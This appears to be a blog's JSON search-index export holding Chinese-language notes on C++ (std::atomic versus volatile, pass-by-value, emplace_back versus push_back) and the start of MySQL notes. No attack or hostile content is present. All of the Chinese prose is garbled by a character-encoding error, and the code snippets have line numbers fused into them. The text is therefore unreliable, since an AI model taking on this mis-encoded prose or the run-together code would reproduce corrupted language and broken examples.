åœ¨è¿™äº›è¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå…¶ä»–çº¿ç¨‹è¯»å–aiï¼Œåªèƒ½è¯»å–åˆ°0ï¼Œ10ï¼Œ11ä¸‰ä¸ªå€¼å…¶ä¸­ä¸€ä¸ªã€‚å‡è®¾åªæœ‰è¿™ä¸ªçº¿ç¨‹ä¼šä¿®æ”¹aiï¼Œæ²¡æœ‰å…¶ä»–å¯èƒ½çš„å€¼ã€‚ ä½¿ç”¨volatileåœ¨å¤šçº¿ç¨‹ä¸­å®é™…ä¸Šä¸ä¿è¯ä»»ä½•äº‹æƒ…ï¼š 12345volatile int vi(0); //åˆå§‹åŒ–viä¸º0vi = 10; //è®¾ç½®viä¸º10 std::cout &lt;&lt; vi; //è¯»viçš„å€¼++vi; //é€’å¢viåˆ°11--vi; //é€’å‡viåˆ°10 ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœå…¶ä»–çº¿ç¨‹è¯»å–viï¼Œå¯èƒ½è¯»åˆ°ä»»ä½•å€¼ï¼Œæ¯”å¦‚-12ï¼Œ68ï¼Œ4090727â€”â€”ä»»ä½•å€¼ï¼è¿™ä»½ä»£ç æœ‰æœªå®šä¹‰è¡Œä¸ºï¼Œå› ä¸ºè¿™é‡Œçš„è¯­å¥ä¿®æ”¹viï¼Œæ‰€ä»¥å¦‚æœåŒæ—¶å…¶ä»–çº¿ç¨‹è¯»å–viï¼ŒåŒæ—¶å­˜åœ¨å¤šä¸ªreaderså’Œwritersè¯»å–æ²¡æœ‰std::atomicæˆ–è€…äº’æ–¥é”ä¿æŠ¤çš„å†…å­˜ï¼Œè¿™å°±æ˜¯æ•°æ®ç«äº‰çš„å®šä¹‰ã€‚ æŒ‡ä»¤æ’åº ä»£ç æ‰§è¡Œæœ¬èº«ï¼Œå³ä½¿ç¼–è¯‘å™¨æ²¡æœ‰é‡æ’é¡ºåºï¼Œåº•å±‚ç¡¬ä»¶ä¹Ÿå¯èƒ½é‡æ’ï¼ˆæˆ–è€…å¯èƒ½ä½¿å®ƒçœ‹èµ·æ¥è¿è¡Œåœ¨å…¶ä»–æ ¸å¿ƒä¸Šï¼‰ï¼Œå› ä¸ºæœ‰æ—¶è¿™æ ·ä»£ç æ‰§è¡Œæ›´å¿«ã€‚ ç„¶è€Œï¼Œstd::atomicä¼šé™åˆ¶è¿™ç§é‡æ’åºï¼Œä¿æŒäº†æŒ‡ä»¤æ‰§è¡Œçš„æœ‰åºæ€§ã€‚ 123std::atomic&lt;bool&gt; valVailable(false); auto imptValue = computeImportantValue(); //è®¡ç®—å€¼valAvailable = true; //å‘Šè¯‰å¦ä¸€ä¸ªä»»åŠ¡ï¼Œå€¼å¯ç”¨äº† ç¼–è¯‘å™¨ä¸ä»…è¦ä¿è¯imptValueå’ŒvalAvailableçš„èµ‹å€¼é¡ºåºï¼Œè¿˜è¦ä¿è¯ç”Ÿæˆçš„ç¡¬ä»¶ä»£ç ä¸ä¼šæ”¹å˜è¿™ä¸ªé¡ºåºã€‚ç»“æœå°±æ˜¯ï¼Œå°†valAvailableå£°æ˜ä¸ºstd::atomicç¡®ä¿äº†å¿…è¦çš„é¡ºåºâ€”â€”å…¶ä»–çº¿ç¨‹çœ‹åˆ°çš„æ˜¯imptValueå€¼çš„æ”¹å˜ä¸ä¼šæ™šäºvalAvailableã€‚ å°†valAvailableå£°æ˜ä¸ºvolatileä¸èƒ½ä¿è¯ä¸Šè¿°é¡ºåºï¼š 123volatile bool valVailable(false); auto imptValue = computeImportantValue();valAvailable = true; //å…¶ä»–çº¿ç¨‹å¯èƒ½çœ‹åˆ°è¿™ä¸ªèµ‹å€¼æ“ä½œæ—©äºimptValueçš„èµ‹å€¼æ“ä½œ è¿™ä»½ä»£ç ç¼–è¯‘å™¨å¯èƒ½å°†imptValueå’ŒvalAvailableèµ‹å€¼é¡ºåºå¯¹è°ƒã€‚ ç»“è®º std::atomicç”¨äºåœ¨ä¸ä½¿ç”¨äº’æ–¥é”æƒ…å†µä¸‹ï¼Œæ¥ä½¿å˜é‡è¢«å¤šä¸ªçº¿ç¨‹è®¿é—®çš„æƒ…å†µã€‚æ˜¯ç”¨æ¥ç¼–å†™å¹¶å‘ç¨‹åºçš„ä¸€ä¸ªå·¥å…·ã€‚ volatileç”¨åœ¨è¯»å–å’Œå†™å…¥ä¸åº”è¢«ä¼˜åŒ–æ‰çš„å†…å­˜ä¸Šã€‚æ˜¯ç”¨æ¥å¤„ç†ç‰¹æ®Šå†…å­˜çš„ä¸€ä¸ªå·¥å…·ã€‚ å…¶ä»–ä¼˜åŒ– 41 å¯¹äºç§»åŠ¨æˆæœ¬ä½ä¸”æ€»æ˜¯è¢«æ‹·è´çš„å¯æ‹·è´å½¢å‚ï¼Œè€ƒè™‘æŒ‰å€¼ä¼ é€’ ä¸‰ä¸ªç‰ˆæœ¬çš„addNameï¼š 12345678910111213141516171819202122232425class Widget &#123; //æ–¹æ³•1ï¼šå¯¹å·¦å€¼å’Œå³å€¼é‡è½½public: void addName(const std::string&amp; newName) &#123; names.push_back(newName); &#125; // rvalues void addName(std::string&amp;&amp; newName) &#123; names.push_back(std::move(newName)); &#125; â€¦private: std::vector&lt;std::string&gt; names;&#125;;class Widget &#123; //æ–¹æ³•2ï¼šä½¿ç”¨é€šç”¨å¼•ç”¨public: template&lt;typename T&gt; void addName(T&amp;&amp; newName) &#123; names.push_back(std::forward&lt;T&gt;(newName)); &#125; â€¦&#125;;class Widget &#123; //æ–¹æ³•3ï¼šä¼ å€¼public: void addName(std::string newName) &#123; names.push_back(std::move(newName)); &#125; â€¦&#125;; æˆ‘å°†å‰ä¸¤ä¸ªç‰ˆæœ¬ç§°ä¸ºâ€œæŒ‰å¼•ç”¨æ–¹æ³•â€ï¼Œå› ä¸ºéƒ½æ˜¯é€šè¿‡å¼•ç”¨ä¼ é€’å½¢å‚ã€‚ ä»ç„¶è€ƒè™‘è¿™ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼š 123456Widget w;â€¦std::string name(\"Bart\");w.addName(name); //ä¼ å·¦å€¼â€¦w.addName(name + \"Jenne\"); //ä¼ å³å€¼ ç°åœ¨åˆ†åˆ«è€ƒè™‘ä¸‰ç§å®ç°ä¸­ï¼Œç»™Widgetæ·»åŠ ä¸€ä¸ªåå­—çš„ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œæ‹·è´å’Œç§»åŠ¨æ“ä½œçš„å¼€é”€ã€‚ é‡è½½ï¼šæ— è®ºä¼ é€’å·¦å€¼è¿˜æ˜¯ä¼ é€’å³å€¼ï¼Œè°ƒç”¨éƒ½ä¼šç»‘å®šåˆ°ä¸€ä¸ªå«newNameçš„å¼•ç”¨ä¸Šã€‚ä»æ‹·è´å’Œç§»åŠ¨æ“ä½œæ–¹é¢çœ‹ï¼Œè¿™ä¸ªè¿‡ç¨‹é›¶å¼€é”€ã€‚å·¦å€¼é‡è½½ä¸­ï¼ŒnewNameæ‹·è´åˆ°Widget::namesä¸­ï¼Œå³å€¼é‡è½½ä¸­ï¼Œç§»åŠ¨è¿›å»ã€‚ â€‹ å¼€é”€æ€»ç»“ï¼šå·¦å€¼ä¸€æ¬¡æ‹·è´ï¼Œå³å€¼ä¸€æ¬¡ç§»åŠ¨ã€‚ ä½¿ç”¨é€šç”¨å¼•ç”¨ï¼šåŒé‡è½½ä¸€æ ·ï¼Œè°ƒç”¨ä¹Ÿç»‘å®šåˆ°addNameè¿™ä¸ªå¼•ç”¨ä¸Šï¼Œæ²¡æœ‰å¼€é”€ã€‚ç”±äºä½¿ç”¨äº†std::forwardï¼Œå·¦å€¼std::stringå®å‚ä¼šæ‹·è´åˆ°Widget::namesï¼Œå³å€¼std::stringå®å‚ç§»åŠ¨è¿›å»ã€‚ â€‹ å¯¹std::stringå®å‚æ¥è¯´ï¼Œå¼€é”€åŒé‡è½½æ–¹å¼ä¸€æ ·ï¼šå·¦å€¼ä¸€æ¬¡æ‹·è´ï¼Œå³å€¼ä¸€æ¬¡ç§»åŠ¨ã€‚ æŒ‰å€¼ä¼ é€’ï¼šæ— è®ºä¼ é€’å·¦å€¼è¿˜æ˜¯å³å€¼ï¼Œéƒ½å¿…é¡»æ„é€ newNameå½¢å‚ã€‚å¦‚æœä¼ é€’çš„æ˜¯å·¦å€¼ï¼Œéœ€è¦æ‹·è´çš„å¼€é”€ï¼Œå¦‚æœä¼ é€’çš„æ˜¯å³å€¼ï¼Œéœ€è¦ç§»åŠ¨çš„å¼€é”€ã€‚åœ¨å‡½æ•°çš„å®ç°ä¸­ï¼ŒnewNameæ€»æ˜¯é‡‡ç”¨ç§»åŠ¨çš„æ–¹å¼åˆ°Widget::namesã€‚ â€‹ å¼€é”€æ€»ç»“ï¼šå·¦å€¼å®å‚ï¼Œä¸€æ¬¡æ‹·è´ä¸€æ¬¡ç§»åŠ¨ï¼Œå³å€¼å®å‚ä¸¤æ¬¡ç§»åŠ¨ã€‚ å¯¹äºç‰¹æ®Šçš„åœºæ™¯ï¼Œå¯æ‹·è´ä¸”ç§»åŠ¨å¼€é”€å°çš„ç±»å‹ï¼Œä¼ é€’ç»™æ€»æ˜¯ä¼šæ‹·è´ä»–ä»¬çš„ä¸€ä¸ªå‡½æ•°ï¼Œåˆ‡ç‰‡ä¹Ÿä¸éœ€è¦è€ƒè™‘ï¼Œã€‚è¿™æ—¶ï¼ŒæŒ‰å€¼ä¼ é€’å°±æä¾›äº†ä¸€ç§ç®€å•çš„å®ç°æ–¹å¼ï¼Œæ•ˆç‡æ¥è¿‘ä¼ é€’å¼•ç”¨çš„å‡½æ•°ï¼Œä½†æ˜¯é¿å…äº†ä¼ å¼•ç”¨æ–¹æ¡ˆçš„ç¼ºç‚¹ã€‚ å½“ç§»åŠ¨çš„å¼€é”€è¾ƒä½ï¼Œé¢å¤–çš„ä¸€æ¬¡ç§»åŠ¨æ‰èƒ½è¢«å¼€å‘è€…æ¥å—ï¼Œä½†æ˜¯å½“ç§»åŠ¨çš„å¼€é”€å¾ˆå¤§ï¼Œæ‰§è¡Œä¸å¿…è¦çš„ç§»åŠ¨å°±ç±»ä¼¼æ‰§è¡Œä¸€ä¸ªä¸å¿…è¦çš„æ‹·è´ï¼Œä¹Ÿå°±æ˜¯é¿å…ä¸å¿…è¦çš„æ‹·è´ã€‚ å¯¹äºå¯æ‹·è´å½¢å‚ä½¿ç”¨æŒ‰å€¼ä¼ é€’ã€‚ä¸ç¬¦åˆæ­¤æ¡ä»¶çš„çš„å½¢å‚å¿…é¡»æœ‰åªå¯ç§»åŠ¨çš„ç±»å‹ï¼ˆmove-only typesï¼‰ã€‚ åªä¼šåœ¨ç›®æ ‡ä»£ç ä¸­ç”Ÿæˆä¸€ä¸ªå‡½æ•°ã€‚é¿å…äº†é€šç”¨å¼•ç”¨çš„ç§ç§é—®é¢˜ã€‚ åªå¯¹æ€»æ˜¯è¢«æ‹·è´çš„å½¢å‚è€ƒè™‘æŒ‰å€¼ä¼ é€’ã€‚å› ä¸ºä¼ å¼•ç”¨å¯ä»¥é¿å…è¿™ä¸ªä¸å¿…è¦çš„å¼€é”€ã€‚ ç»“è®º å¯¹äºå¯æ‹·è´ï¼Œç§»åŠ¨å¼€é”€ä½ï¼Œè€Œä¸”æ— æ¡ä»¶è¢«æ‹·è´çš„å½¢å‚ï¼ŒæŒ‰å€¼ä¼ é€’æ•ˆç‡åŸºæœ¬ä¸æŒ‰å¼•ç”¨ä¼ é€’æ•ˆç‡ä¸€è‡´ï¼Œè€Œä¸”æ˜“äºå®ç°ï¼Œè¿˜ç”Ÿæˆæ›´å°‘çš„ç›®æ ‡ä»£ç ã€‚ æŸäº›æƒ…å†µä¸‹ï¼Œé€šè¿‡æ„é€ æ‹·è´å½¢å‚å¯èƒ½æ¯”é€šè¿‡èµ‹å€¼æ‹·è´å½¢å‚å¼€é”€å¤§çš„å¤šã€‚ æŒ‰å€¼ä¼ é€’ä¼šå¼•èµ·åˆ‡ç‰‡é—®é¢˜ï¼Œæ‰€è¯´ä¸é€‚åˆåŸºç±»å½¢å‚ç±»å‹ã€‚ 42 emplacement è€Œä¸æ˜¯ insertion ç¼–è¯‘å™¨å¤„ç†çš„ä¸‹é¢çš„è°ƒç”¨ï¼š 1vs.push_back(std::string(\"xyzzy\")); //åˆ›å»ºä¸´æ—¶std::stringï¼ŒæŠŠå®ƒä¼ ç»™push_back ä¸ºäº†åœ¨std::stringå®¹å™¨ä¸­åˆ›å»ºæ–°å…ƒç´ ï¼Œè°ƒç”¨äº†std::stringçš„æ„é€ å‡½æ•°ï¼Œä½†æ˜¯è¿™ä»½ä»£ç å¹¶ä¸ä»…è°ƒç”¨äº†ä¸€æ¬¡æ„é€ å‡½æ•°ï¼Œè€Œæ˜¯è°ƒç”¨äº†ä¸¤æ¬¡ï¼Œè€Œä¸”è¿˜è°ƒç”¨äº†std::stringææ„å‡½æ•°ã€‚ä¸‹é¢æ˜¯åœ¨push_backè¿è¡Œæ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼š ä¸€ä¸ªstd::stringçš„ä¸´æ—¶å¯¹è±¡ä»å­—é¢é‡â€œxyzzyâ€è¢«åˆ›å»ºã€‚è¿™ä¸ªå¯¹è±¡æ²¡æœ‰åå­—ï¼Œæˆ‘ä»¬å¯ä»¥ç§°ä¸ºtempã€‚tempçš„æ„é€ æ˜¯ç¬¬ä¸€æ¬¡std::stringæ„é€ ã€‚å› ä¸ºæ˜¯ä¸´æ—¶å˜é‡ï¼Œæ‰€ä»¥tempæ˜¯å³å€¼ã€‚ tempè¢«ä¼ é€’ç»™push_backçš„å³å€¼é‡è½½å‡½æ•°ï¼Œç»‘å®šåˆ°å³å€¼å¼•ç”¨å½¢å‚xã€‚åœ¨std::vectorçš„å†…å­˜ä¸­ä¸€ä¸ªxçš„å‰¯æœ¬è¢«åˆ›å»ºã€‚è¿™æ¬¡æ„é€ â€”â€”ä¹Ÿæ˜¯ç¬¬äºŒæ¬¡æ„é€ â€”â€”åœ¨std::vectorå†…éƒ¨çœŸæ­£åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚ åœ¨push_backè¿”å›ä¹‹åï¼Œtempç«‹åˆ»è¢«é”€æ¯ï¼Œè°ƒç”¨äº†ä¸€æ¬¡std::stringçš„ææ„å‡½æ•°ã€‚ ä½¿ç”¨ä¼ é€’ç»™å®ƒçš„ä»»ä½•å®å‚ç›´æ¥åœ¨std::vectorå†…éƒ¨æ„é€ ä¸€ä¸ªstd::stringã€‚æ²¡æœ‰ä¸´æ—¶å˜é‡ä¼šç”Ÿæˆï¼š 1vs.emplace_back(\"xyzzy\"); //ç›´æ¥ç”¨â€œxyzzyâ€åœ¨vså†…æ„é€ std::string emplace_backä½¿ç”¨å®Œç¾è½¬å‘ï¼Œå› æ­¤åªè¦ä½ æ²¡æœ‰é‡åˆ°ä½¿ç”¨å®Œç¾è½¬å‘çš„é™åˆ¶ï¼Œå°±å¯ä»¥ä¼ é€’ä»»ä½•å®å‚ä»¥åŠç»„åˆåˆ°emplace_backã€‚ emplace_backï¼š å€¼æ˜¯é€šè¿‡æ„é€ å‡½æ•°æ·»åŠ åˆ°å®¹å™¨ï¼Œè€Œä¸æ˜¯ç›´æ¥èµ‹å€¼ã€‚ ä¼ é€’çš„å®å‚ç±»å‹ä¸å®¹å™¨çš„åˆå§‹åŒ–ç±»å‹ä¸åŒã€‚ å®¹å™¨ä¸æ‹’ç»é‡å¤é¡¹ä½œä¸ºæ–°å€¼ã€‚ 12vs.emplace_back(\"xyzzy\"); //åœ¨å®¹å™¨æœ«å°¾æ„é€ æ–°å€¼ï¼›ä¸æ˜¯ä¼ é€’çš„å®¹å™¨ä¸­å…ƒ //ç´ çš„ç±»å‹ï¼›æ²¡æœ‰ä½¿ç”¨æ‹’ç»é‡å¤é¡¹çš„å®¹å™¨ èµ„æºç®¡ç† å‡å®šä½ æœ‰ä¸€ä¸ªç››æ”¾std::shared_ptr&lt;Widget&gt;sçš„å®¹å™¨ï¼Œ 1std::list&lt;std::shared_ptr&lt;Widget&gt;&gt; ptrs; ä½¿ç”¨push_backçš„ä»£ç å¦‚ä¸‹ï¼š 1ptrs.push_back(std::shared_ptr&lt;Widget&gt;(new Widget, killWidget)); ä¹Ÿå¯ä»¥åƒè¿™æ ·ï¼š 1ptrs.push_back(&#123;new Widget, killWidget&#125;); ä¸ç®¡å“ªç§å†™æ³•ï¼Œåœ¨è°ƒç”¨push_backå‰ä¼šç”Ÿæˆä¸€ä¸ªä¸´æ—¶std::shared_ptrå¯¹è±¡ã€‚push_backçš„å½¢å‚æ˜¯std::shared_ptrçš„å¼•ç”¨ï¼Œå› æ­¤å¿…é¡»æœ‰ä¸€ä¸ªstd::shared_ptrã€‚ ç”¨emplace_backåº”è¯¥å¯ä»¥é¿å…std::shared_pträ¸´æ—¶å¯¹è±¡çš„åˆ›å»ºï¼Œä½†æ˜¯åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œä¸´æ—¶å¯¹è±¡å€¼å¾—è¢«åˆ›å»ºã€‚è€ƒè™‘å¦‚ä¸‹å¯èƒ½çš„æ—¶é—´åºåˆ—ï¼š åœ¨ä¸Šè¿°çš„è°ƒç”¨ä¸­ï¼Œä¸€ä¸ªstd::shared_ptr&lt;Widget&gt;çš„ä¸´æ—¶å¯¹è±¡è¢«åˆ›å»ºæ¥æŒæœ‰â€œnew Widgetâ€è¿”å›çš„åŸå§‹æŒ‡é’ˆã€‚ç§°è¿™ä¸ªå¯¹è±¡ä¸ºtempã€‚ push_backé€šè¿‡å¼•ç”¨æ¥å—tempã€‚åœ¨å­˜å‚¨tempçš„å‰¯æœ¬çš„listèŠ‚ç‚¹çš„å†…å­˜åˆ†é…è¿‡ç¨‹ä¸­ï¼Œå†…å­˜æº¢å‡ºå¼‚å¸¸è¢«æŠ›å‡ºã€‚ éšç€å¼‚å¸¸ä»push_backçš„ä¼ æ’­ï¼Œtempè¢«é”€æ¯ã€‚ä½œä¸ºå”¯ä¸€ç®¡ç†è¿™ä¸ªWidgetçš„std::shared_ptrï¼Œå®ƒè‡ªåŠ¨é”€æ¯Widgetï¼Œåœ¨è¿™é‡Œå°±æ˜¯è°ƒç”¨killWidgetã€‚ è¿™æ ·çš„è¯ï¼Œå³ä½¿å‘ç”Ÿäº†å¼‚å¸¸ï¼Œæ²¡æœ‰èµ„æºæ³„æ¼ã€‚ è€ƒè™‘ä½¿ç”¨emplace_backä»£æ›¿push_backï¼š 1ptrs.emplace_back(new Widget, killWidget); é€šè¿‡new Widgetåˆ›å»ºçš„åŸå§‹æŒ‡é’ˆå®Œç¾è½¬å‘ç»™emplace_backä¸­ï¼ŒlistèŠ‚ç‚¹è¢«åˆ†é…çš„ä½ç½®ã€‚å¦‚æœåˆ†é…å¤±è´¥ï¼Œè¿˜æ˜¯æŠ›å‡ºå†…å­˜æº¢å‡ºå¼‚å¸¸ã€‚ å½“å¼‚å¸¸ä»emplace_backä¼ æ’­ï¼ŒåŸå§‹æŒ‡é’ˆæ˜¯ä»…æœ‰çš„è®¿é—®å †ä¸ŠWidgetçš„é€”å¾„ï¼Œä½†æ˜¯å› ä¸ºå¼‚å¸¸è€Œä¸¢å¤±äº†ï¼Œé‚£ä¸ªWidgetçš„èµ„æºï¼ˆä»¥åŠä»»ä½•å®ƒæ‰€æ‹¥æœ‰çš„èµ„æºï¼‰å‘ç”Ÿäº†æ³„æ¼ã€‚ åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œç”Ÿå‘½å‘¨æœŸä¸è‰¯å¥½ï¼Œè¿™ä¸ªå¤±è¯¯ä¸èƒ½èµ–std::shared_ptrã€‚ä½¿ç”¨å¸¦è‡ªå®šä¹‰åˆ é™¤å™¨çš„std::unique_pträ¹Ÿä¼šæœ‰åŒæ ·çš„é—®é¢˜ã€‚ è§£å†³æ–¹æ³•æ˜¯ï¼š 123std::shared_ptr&lt;Widget&gt; spw(new Widget, //åˆ›å»ºWidgetï¼Œè®©spwç®¡ç†å®ƒ killWidget);ptrs.push_back(std::move(spw)); //æ·»åŠ spwå³å€¼ emplace_backçš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š 12std::shared_ptr&lt;Widget&gt; spw(new Widget, killWidget);ptrs.emplace_back(std::move(spw)); æ— è®ºå“ªç§æ–¹å¼ï¼Œéƒ½ä¼šäº§ç”Ÿspwçš„åˆ›å»ºå’Œé”€æ¯æˆæœ¬ã€‚ ä¸explicitçš„æ„é€ å‡½æ•°çš„äº¤äº’ ç›¸ä¼¼çš„åˆå§‹åŒ–è¯­å¥å¯¼è‡´äº†å¤šä¹ˆä¸ä¸€æ ·çš„ç»“æœï¼š 12std::regex r1 = nullptr; //é”™è¯¯ï¼ä¸èƒ½ç¼–è¯‘std::regex r2(nullptr); //å¯ä»¥ç¼–è¯‘ åœ¨æ ‡å‡†çš„å®˜æ–¹æœ¯è¯­ä¸­ï¼Œç”¨äºåˆå§‹åŒ–r1çš„è¯­æ³•ï¼ˆä½¿ç”¨ç­‰å·ï¼‰æ˜¯æ‰€è°“çš„æ‹·è´åˆå§‹åŒ–ã€‚ç›¸åï¼Œç”¨äºåˆå§‹åŒ–r2çš„è¯­æ³•æ˜¯ï¼ˆä½¿ç”¨å°æ‹¬å·ï¼Œæœ‰æ—¶ä¹Ÿç”¨èŠ±æ‹¬å·ï¼‰è¢«ç§°ä¸ºç›´æ¥åˆå§‹åŒ–ã€‚ emplace_back ä½¿ç”¨ç›´æ¥åˆå§‹åŒ–ï¼Œè¿™æ„å‘³ç€å¯èƒ½ä½¿ç”¨explicitçš„æ„é€ å‡½æ•°ã€‚ push_back ä½¿ç”¨æ‹·è´åˆå§‹åŒ–ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨explicitçš„æ„é€ å‡½æ•°ã€‚å› æ­¤ï¼š 123regexes.emplace_back(nullptr); //å¯ç¼–è¯‘ã€‚ç›´æ¥åˆå§‹åŒ–å…è®¸ä½¿ç”¨æ¥å—æŒ‡é’ˆçš„ //std::regexçš„explicitæ„é€ å‡½æ•°regexes.push_back(nullptr); //é”™è¯¯ï¼æ‹·è´åˆå§‹åŒ–ä¸å…è®¸ç”¨é‚£ä¸ªæ„é€ å‡½æ•° è·å¾—çš„ç»éªŒæ˜¯ï¼Œå½“ä½ ä½¿ç”¨emplace_backæ—¶ï¼Œè¯·ç‰¹åˆ«å°å¿ƒç¡®ä¿ä¼ é€’äº†æ­£ç¡®çš„å®å‚ï¼Œå› ä¸ºå³ä½¿æ˜¯explicitçš„æ„é€ å‡½æ•°ä¹Ÿä¼šè¢«ç¼–è¯‘å™¨è€ƒè™‘ï¼Œç¼–è¯‘å™¨ä¼šè¯•å›¾ä»¥æœ‰æ•ˆæ–¹å¼è§£é‡Šä½ çš„ä»£ç ã€‚ ç»“è®º åŸåˆ™ä¸Šï¼Œemplace_backæœ‰æ—¶ä¼šæ¯”push_backé«˜æ•ˆï¼Œå¹¶ä¸”ä¸ä¼šæ›´å·®ã€‚ å®é™…ä¸Šï¼Œå½“ä»¥ä¸‹æ¡ä»¶æ»¡è¶³æ—¶ï¼Œemplace_backæ›´å¿«ï¼šï¼ˆ1ï¼‰å€¼è¢«æ„é€ åˆ°å®¹å™¨ä¸­ï¼Œè€Œä¸æ˜¯ç›´æ¥èµ‹å€¼ï¼›ï¼ˆ2ï¼‰ä¼ å…¥çš„ç±»å‹ä¸å®¹å™¨çš„å…ƒç´ ç±»å‹ä¸ä¸€è‡´ï¼›ï¼ˆ3ï¼‰å®¹å™¨ä¸æ‹’ç»å·²ç»å­˜åœ¨çš„é‡å¤å€¼ã€‚ emplace_backå¯èƒ½æ‰§è¡Œpush_backæ‹’ç»çš„ç±»å‹è½¬æ¢ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"MySQLç¬”è®°","slug":"MySQLç¬”è®°","date":"2022-04-11T15:00:53.000Z","updated":"2024-01-11T01:43:03.994Z","comments":true,"path":"posts/fd5f561d.html","link":"","permalink":"https://racleray.github.io/posts/fd5f561d.html","excerpt":"æ•°æ®åº“ï¼ŒMySQL + InnoDB","text":"æ•°æ®åº“ æ•°æ®åº“å°±æ˜¯å­˜å‚¨æ•°æ®çš„ä»“åº“ï¼Œå…¶æœ¬è´¨æ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œæ•°æ®æŒ‰ç…§ç‰¹å®šçš„æ ¼å¼å°†æ•°æ®å­˜å‚¨èµ·æ¥ æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDataBase Management Systemï¼ŒDBMSï¼‰ MySQLç™»å½• MySQLæ˜¯ä¸€ä¸ªéœ€è¦è´¦æˆ·åå¯†ç ç™»å½•çš„æ•°æ®åº“ï¼Œç™»é™†åä½¿ç”¨ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªé»˜è®¤çš„rootè´¦å·ï¼Œä½¿ç”¨å®‰è£…æ—¶è®¾ç½®çš„å¯†ç å³å¯ç™»å½•ã€‚ 12345678æ ¼å¼1ï¼šcmd&gt; mysql â€“uç”¨æˆ·å â€“på¯†ç ä¾‹å¦‚ï¼šmysql -uroot â€“prootæ ¼å¼2: mysql â€“uç”¨æˆ·å â€“pè¯·è¾“å…¥å¯†ç : rootæ ¼å¼2ï¼šcmd&gt; mysql --host&#x3D;ipåœ°å€ --user&#x3D;ç”¨æˆ·å --password&#x3D;å¯†ç ä¾‹å¦‚ï¼šmysql --host&#x3D;127.0.0.1 --user&#x3D;root --password&#x3D;root SQL æ•°æ®å®šä¹‰è¯­è¨€ï¼šç®€ç§°DDL(Data Definition Language)ï¼šcreateï¼Œalterï¼Œdropç­‰ æ•°æ®æ“ä½œè¯­è¨€ï¼šç®€ç§°DML(Data Manipulation Language)ï¼šinsertï¼Œdeleteï¼Œupdateç­‰ æ•°æ®æŸ¥è¯¢è¯­è¨€ï¼šç®€ç§°DQL(Data Query Language)ï¼šselectï¼Œfromï¼Œwhereç­‰ æ•°æ®æ§åˆ¶è¯­è¨€ï¼šç®€ç§°DCL(Data Control Language)ï¼šå®šä¹‰æ•°æ®åº“çš„è®¿é—®æƒé™å’Œå®‰å…¨çº§åˆ«ï¼ŒåŠåˆ›å»ºç”¨æˆ· SQLè¯­å¥å¯ä»¥å•è¡Œæˆ–å¤šè¡Œä¹¦å†™ï¼Œä»¥åˆ†å·ç»“å°¾ã€‚ æ³¨é‡Šå½¢å¼ï¼š 123-- å•è¡Œæ³¨é‡Šå†…å®¹/* å¤šè¡Œæ³¨é‡Š */# å•è¡Œæ³¨é‡Šå†…å®¹ NOTE: å¸¸ç”¨åŠŸèƒ½æŸ¥ AI æ•ˆç‡å¾—å¤šï¼ŒNICE æ³¨æ„ç‚¹ åˆ é™¤è¡¨ä¸­æ‰€æœ‰è®°å½•ä½¿ç”¨ã€delete from è¡¨åã€‘ï¼Œè¿˜æ˜¯ç”¨ã€truncate table è¡¨åã€‘ï¼Ÿ delete ï¼šä¸€æ¡ä¸€æ¡åˆ é™¤ï¼Œä¸æ¸…ç©º auto_increment è®°å½•æ•°ã€‚ truncate ï¼šç›´æ¥å°†è¡¨åˆ é™¤ï¼Œé‡æ–°å»ºè¡¨ï¼Œauto_increment å°†ç½®ä¸ºé›¶ï¼Œä»æ–°å¼€å§‹ åŸåˆ™ä¸Šï¼Œäº’è”ç½‘åº”ç”¨ä¸€èˆ¬åˆ é™¤æ˜¯æ·»åŠ  deleted æ ‡è®°ï¼Œå®é™…ä¸Šæ•°æ®ä¿ç•™ã€‚ æœ‰äº›åœºæ™¯ï¼ŒIoTæ•°æ®é‡‡é›†ï¼Œå¯ä»¥é€‚å½“åˆ é™¤æ•°æ®ã€‚ çº¦æŸ ä¸»é”®çº¦æŸ primary key å”¯ä¸€æ€§çº¦æŸ unique éç©ºçº¦æŸ not null å¤–é”®çº¦æŸ foreign key æŸ¥è¯¢ æ¡ä»¶æŸ¥è¯¢ having å’Œ where çš„åŒºåˆ«: å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œåˆ†ç»„å‰ï¼Œå°†ä¸ç¬¦åˆ where æ¡ä»¶çš„è®°å½•è¿‡æ»¤æ‰ï¼Œç„¶åå†åˆ†ç»„ã€‚ where åé¢ï¼Œä¸èƒ½å†ä½¿ç”¨èšåˆå‡½æ•°ã€‚ ç­›é€‰æ»¡è¶³æ¡ä»¶çš„ç»„ï¼Œåˆ†ç»„ä¹‹åè¿‡æ»¤æ•°æ®ã€‚ having åé¢ï¼Œå¯ä»¥ä½¿ç”¨èšåˆå‡½æ•°ã€‚ èŒƒå›´æŸ¥è¯¢ æ¨¡ç³ŠæŸ¥è¯¢ åˆ†ç»„èšåˆ group by åˆ†é¡µæŸ¥è¯¢ limit [offset, length] é€»è¾‘åˆ†é¡µï¼šå°†æ•°æ®åº“ä¸­çš„æ•°æ®æŸ¥è¯¢åˆ°å†…å­˜ä¹‹åå†è¿›è¡Œåˆ†é¡µã€‚ ç‰©ç†åˆ†é¡µï¼šé€šè¿‡ LIMIT å…³é”®å­—ï¼Œç›´æ¥åœ¨æ•°æ®åº“ä¸­è¿›è¡Œåˆ†é¡µï¼Œæœ€ç»ˆè¿”å›çš„æ•°æ®ï¼Œåªæ˜¯åˆ†é¡µåçš„æ•°æ®ã€‚ å­æŸ¥è¯¢ 